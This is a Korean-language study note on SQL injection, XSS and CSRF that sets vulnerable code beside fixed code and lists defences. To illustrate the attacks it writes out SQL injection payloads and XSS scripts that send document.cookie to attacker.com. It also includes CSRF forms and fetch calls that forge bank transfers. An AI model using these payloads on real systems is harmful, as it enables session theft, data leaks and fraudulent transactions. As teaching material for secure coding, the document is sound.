# 10.3.1 SQL Injection, XSS, CSRF

## 1. 웹 보안 공격 개요

### 세 가지 주요 공격의 특징
웹 애플리케이션에서 가장 빈번하고 위험한 3대 공격으로, **입력 검증 부족**에서 비롯되는 공통점을 가진다.

| 공격 유형 | 대상 | 핵심 원인 | 주요 피해 |
|-----------|------|-----------|-----------|
| **SQL Injection** | 데이터베이스 | SQL 쿼리 조작 | 데이터 유출/조작 |
| **XSS** | 클라이언트 브라우저 | 스크립트 삽입 | 세션 탈취, 사용자 정보 도용 |
| **CSRF** | 사용자 요청 | 위조된 요청 실행 | 권한 남용, 의도하지 않은 작업 수행 |

---

## 2. SQL Injection (SQL 인젝션)

### 정의 및 동작 원리
**악의적인 SQL 코드를 입력값에 삽입하여 데이터베이스를 조작하는 공격**이다.
웹 애플리케이션이 사용자 입력을 적절히 검증하지 않고 SQL 쿼리에 직접 삽입할 때 발생한다.

### 공격 유형

#### 1) Union-based SQL Injection
여러 SELECT 문을 UNION으로 결합하여 추가 데이터 조회
```sql
-- 정상 쿼리
SELECT * FROM users WHERE id = '1'

-- 공격 쿼리  
SELECT * FROM users WHERE id = '1' UNION SELECT username, password FROM admin --'
```

#### 2) Blind SQL Injection
쿼리 결과가 화면에 직접 출력되지 않을 때 참/거짓으로 정보 추출
```sql
-- 시간 지연을 이용한 공격
SELECT * FROM users WHERE id = '1' AND SLEEP(5) --'
```

#### 3) Time-based SQL Injection
시간 지연 함수를 이용해 조건부로 지연 발생시켜 정보 획득
```sql
SELECT * FROM users WHERE id = '1' AND IF(1=1, SLEEP(5), 0) --'
```

### 취약한 코드 vs 안전한 코드

#### 취약한 코드 (String Concatenation)
```python
# 위험: 사용자 입력을 직접 쿼리에 삽입
user_id = request.GET.get('id')
query = f"SELECT * FROM users WHERE id = '{user_id}'"
cursor.execute(query)
```

#### 안전한 코드 (Prepared Statement)
```python
# 안전: Prepared Statement 사용
user_id = request.GET.get('id')
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_id,))
```

### 방어 기법

#### 1) Prepared Statement (매개변수화된 쿼리)
- **핵심**: SQL 코드와 데이터를 분리
- 데이터베이스가 쿼리 구조를 미리 파싱하여 악의적 코드 실행 방지

#### 2) 입력 검증 및 이스케이프
- 특수문자 (`'`, `"`, `;`, `--`) 이스케이프 처리
- 화이트리스트 기반 입력값 검증

#### 3) 최소 권한 원칙
- 애플리케이션용 DB 계정에 최소한의 권한만 부여
- DROP, CREATE 등 관리자 권한 제거

#### 4) 저장 프로시저 활용
- 미리 정의된 저장 프로시저로 동적 SQL 생성 제한

---

## 3. XSS (Cross-Site Scripting)

### 정의 및 동작 원리
**악의적인 스크립트를 웹 페이지에 삽입하여 다른 사용자의 브라우저에서 실행시키는 공격**이다.
사용자 입력을 적절히 검증하지 않고 웹 페이지에 출력할 때 발생한다.

### 공격 유형

#### 1) Reflected XSS (반사형)
**악성 스크립트가 URL이나 폼 데이터에 포함되어 즉시 실행**되는 방식
```html
<!-- 취약한 코드 -->
<p>검색 결과: <?php echo $_GET['search']; ?></p>

<!-- 공격 URL -->
http://site.com/search.php?search=<script>alert('XSS')</script>
```

#### 2) Stored XSS (저장형)
**악성 스크립트가 서버에 저장되어 다른 사용자가 접근할 때 실행**되는 방식
```html
<!-- 게시판 댓글에 스크립트 저장 -->
댓글: <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
```

#### 3) DOM-based XSS
**클라이언트 측 JavaScript에서 DOM 조작 시 발생**하는 XSS
```javascript
// 취약한 코드
document.getElementById('result').innerHTML = location.hash.substring(1);

// 공격 URL  
http://site.com/page.html#<script>alert('XSS')</script>
```

### 공격 예시

#### 쿠키 탈취
```javascript
<script>
var img = new Image();
img.src = "http://attacker.com/steal.php?cookie=" + document.cookie;
</script>
```

#### 세션 하이재킹
```javascript
<script>
fetch('http://attacker.com/steal', {
  method: 'POST',
  body: 'sessionId=' + document.cookie
});
</script>
```

### 방어 기법

#### 1) 입력 검증 및 출력 인코딩
```html
<!-- 위험 -->
<p><?= $user_input ?></p>

<!-- 안전 -->
<p><?= htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8') ?></p>
```

#### 2) CSP (Content Security Policy)
```html
<!-- HTTP 헤더나 메타 태그로 설정 -->
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

#### 3) 쿠키 보안 설정
```javascript
// HttpOnly: JavaScript에서 쿠키 접근 차단
// Secure: HTTPS에서만 전송
document.cookie = "sessionId=abc123; HttpOnly; Secure; SameSite=Strict";
```

#### 4) DOM 기반 방어
```javascript
// 위험: innerHTML 사용
element.innerHTML = userInput;

// 안전: textContent 사용
element.textContent = userInput;
```

---

## 4. CSRF (Cross-Site Request Forgery)

### 정의 및 동작 원리
**사용자가 의도하지 않은 요청을 자동으로 전송하도록 속이는 공격**이다.
사용자가 인증된 상태에서 악의적인 웹사이트를 방문했을 때, 해당 사이트가 사용자 권한으로 다른 사이트에 요청을 보내는 방식이다.

### 공격 시나리오

#### 1) 이미지 태그를 이용한 GET 요청 공격
```html
<!-- 악의적인 웹사이트에서 -->
<img src="http://bank.com/transfer?to=attacker&amount=1000000" width="0" height="0">
```

#### 2) 자동 폼 전송을 이용한 POST 요청 공격
```html
<form id="malicious" action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000000">
</form>
<script>document.getElementById('malicious').submit();</script>
```

#### 3) AJAX를 이용한 공격
```javascript
fetch('http://bank.com/api/transfer', {
  method: 'POST',
  credentials: 'include', // 쿠키 포함
  body: 'to=attacker&amount=1000000'
});
```

### 방어 기법

#### 1) CSRF 토큰
서버에서 생성한 고유한 토큰을 폼에 포함하여 요청 검증
```html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="randomTokenFromServer">
  <input type="text" name="to">
  <input type="number" name="amount">
</form>
```

#### 2) SameSite 쿠키 속성
```javascript
// 쿠키가 동일 사이트에서만 전송되도록 설정
Set-Cookie: sessionId=abc123; SameSite=Strict
Set-Cookie: sessionId=abc123; SameSite=Lax  // 일부 크로스 사이트 허용
```

#### 3) Referer 헤더 검증
```python
# 요청이 같은 도메인에서 왔는지 확인
referer = request.headers.get('Referer')
if not referer or not referer.startswith('https://mysite.com'):
    return "Invalid request"
```

#### 4) Double Submit Cookie
쿠키와 폼 데이터에 같은 랜덤값을 넣어 검증
```javascript
// 쿠키: csrf=randomValue123
// 폼: <input name="csrf" value="randomValue123">
```

---

## 5. 세 공격 비교표

| 구분 | SQL Injection | XSS | CSRF |
|------|---------------|-----|------|
| **공격 대상** | 데이터베이스 | 클라이언트 브라우저 | 사용자 세션/권한 |
| **공격 방법** | 악성 SQL 삽입 | 악성 스크립트 삽입 | 위조된 요청 전송 |
| **주요 피해** | 데이터 유출/삭제/조작 | 쿠키 탈취, 계정 도용 | 의도하지 않은 작업 수행 |
| **발생 위치** | 서버 측 DB 쿼리 | 클라이언트 브라우저 | 서버 측 요청 처리 |
| **핵심 방어** | Prepared Statement | 출력 인코딩, CSP | CSRF 토큰, SameSite |
| **OWASP 순위** | A03 (Injection) | A07 (XSS) | 별도 분류 |

### 공격 연계 가능성
- **XSS → CSRF**: XSS로 JavaScript 실행 후 CSRF 공격 수행
- **SQL Injection → XSS**: DB에서 조회한 악성 스크립트가 XSS로 실행
- **종합 공격**: 세 공격을 연계하여 더 큰 피해 유발

---

## 6. 실무에서의 종합 방어 전략

### 개발 단계
- **보안 코딩 가이드라인** 준수
- **입력 검증 라이브러리** 활용 (OWASP ESAPI 등)
- **ORM 프레임워크** 사용 (Hibernate, Django ORM)

### 배포 전 검증
- **정적 분석 도구** (SonarQube, Checkmarx)
- **동적 분석 도구** (OWASP ZAP, Burp Suite)
- **침투 테스트** 수행

### 운영 환경 보안
- **WAF(Web Application Firewall)** 적용
- **보안 헤더** 설정 (CSP, X-Frame-Options 등)
- **정기적 보안 패치** 적용

### 모니터링 및 대응
- **로그 모니터링** (공격 시도 탐지)
- **이상 행위 탐지** 시스템 구축
- **사고 대응 계획** 수립

---

## 7. 핵심 요약

```
SQL Injection: Prepared Statement로 방어
XSS: 출력 인코딩 + CSP로 방어  
CSRF: 토큰 + SameSite 쿠키로 방어
공통: 입력 검증이 기본
```

- **SQL Injection**: 악성 SQL 삽입 → **Prepared Statement** 필수
- **XSS**: 악성 스크립트 삽입 → **출력 인코딩 + CSP** 적용
- **CSRF**: 위조 요청 전송 → **CSRF 토큰 + SameSite** 설정
- **공통 방어**: 모든 **입력값 검증**이 기본
- **종합 대응**: 개발·배포·운영 전 단계에서 **다층 보안** 적용
- **연계 공격**: 하나의 취약점이 다른 공격으로 확대될 수 있음